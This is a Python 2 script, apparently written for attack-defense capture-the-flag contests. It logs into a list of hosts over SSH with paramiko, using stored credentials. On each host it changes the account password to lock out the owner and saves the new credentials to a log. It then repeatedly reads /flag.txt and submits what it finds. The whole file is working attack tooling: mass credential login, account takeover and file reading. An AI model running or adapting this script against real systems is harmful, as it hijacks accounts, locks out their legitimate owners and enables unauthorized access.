#!/usr/bin/env python
# -*- coding: utf-8 -*-

import paramiko
import time
import random
import hashlib
import string
import sys
# from submit_flag import submit_flag

def submit_flag(flag):
    print "[+] Submiting flag : %s" % (flag)
    return True

timeout = 3

ssh_clients = []

def md5(content):
    return hashlib.md5(content).hexdigest()

def random_string(length):
    random_range = string.letters + string.digits
    result = ""
    for i in range(length):
        result += random.choice(random_range)
    return result

class SSHClient():
    def __init__(self, host, port, username, auth, timeout=5):
        self.is_root = False
        self.host = host
        self.port = port
        self.username = username
        self.ssh_session = paramiko.SSHClient()
        self.ssh_session.load_system_host_keys()
        self.ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if auth[0]:
            self.password = auth[1]
            self.ssh_session.connect(hostname=self.host, port=self.port, username=self.username, password=self.password, timeout=timeout)
        else:
            self.key_file = auth[1]
            private_key = paramiko.RSAKey._from_private_key_file(self.key_file)
            self.ssh_session.connect(hostname=host, port=port, username=username, key=private_key, timeout=timeout)

    def infomation(self):
        return "%s:%s:%s:%s" % (self.username, self.password, self.host, self.port)

    def exec_command(self, command):
        (stdin, stdout, stderr) = self.ssh_session.exec_command(command)
        return (stdin, stdout, stderr)

    def exec_command_print(ssh, command):
        stdin, stdout, stderr = self.exec_command(command)
        print "-" * 0x10 + " STDOUT " + "-" * 0x10
        print stdout.read()
        print "-" * 0x10 + " STDERR " + "-" * 0x10
        print stderr.read()
        return (stdin, stdout, stderr)

    def check_root(self):
        stdin, stdout, stderr = self.exec_command("id")
        result = stdout.read()
        return ("uid=0" in result, result)

    def change_password(self, new_password):
        is_root = self.check_root()
        if is_root[0]:
            self.is_root = True
            print "[+] Root user detected!"
            stdin, stdout, stderr = self.exec_command("passwd")
            stdin.write("%s\n" % (new_password))
            stdin.write("%s\n" % (new_password))
            stdout.read()
            error_message = stderr.read()[:-1]
            if "success" in error_message:
                self.password = new_password
                return True
            else:
                return False
        else:
            self.is_root = False
            print "[+] Not a root user! (%s)" % (is_root[1])
            stdin, stdout, stderr = self.exec_command("passwd")
            stdin.write("%s\n" % (self.password))
            stdin.write("%s\n" % (new_password))
            stdin.write("%s\n" % (new_password))
            stdout.read()
            error_message = stderr.read()[:-1]
            if "success" in error_message:
                self.password = new_password
                return True
            else:
                return False

    def save_info(self, filename):
        with open(filename, "a+") as f:
            f.write("%s\n" % (self.infomation()))


def get_flag(ssh_client):
    flag = ssh_client.exec_command("cat /flag.txt")[1].read().strip("\n\t ")
    return flag

def main():
    if len(sys.argv) != 2:
        print "Usage : \n\tpython %s [FILENAME]" % (sys.argv[0])
        exit(1)
    round_time = 60
    filename = sys.argv[1]
    print "[+] Loading file : %s" % (filename)
    with open(filename) as f:
        for line in f:
            line = line.rstrip("\n")
            data = line.split(":")
            username = data[0]
            password = data[1]
            host = data[2]
            port = int(data[3])
            auth = (True, password)
            print "[+] Trying login : %s" % (line)
            try:
                ssh_client = SSHClient(host, port, username, auth, timeout=5)
                ssh_clients.append(ssh_client)
            except Exception as e:
                print "[-] %s" % (e)
    print "[+] Login step finished!"
    print "[+] Got [%d] clients!" % (len(ssh_clients))
    print "[+] Starting changing password..."
    for ssh_client in ssh_clients:
        new_password = md5(random_string(0x20))
        if ssh_client.change_password(new_password):
            ssh_client.save_info("success.log")
            print "[+] %s => %s (Success!)" % (ssh_client.infomation(), new_password)
        else:
            print "[-] %s => %s (Failed!)" % (ssh_client.infomation(), new_password)
    print "[+] Starting get flag..."
    while True:
        if len(ssh_clients) == 0:
            print "[+] No client... Breaking..."
            break
        for ssh_client in ssh_clients:
            flag = get_flag(ssh_client)
            print "[+] Flag : %s" % (flag)
            if submit_flag(flag):
                print "[+] Submit success!"
            else:
                print "[-] Submit failed!"
        for i in range(round_time):
            print "[+] Waiting : %s seconds..." % (round_time - i)
            time.sleep(i)

if __name__ == "__main__":
    main()

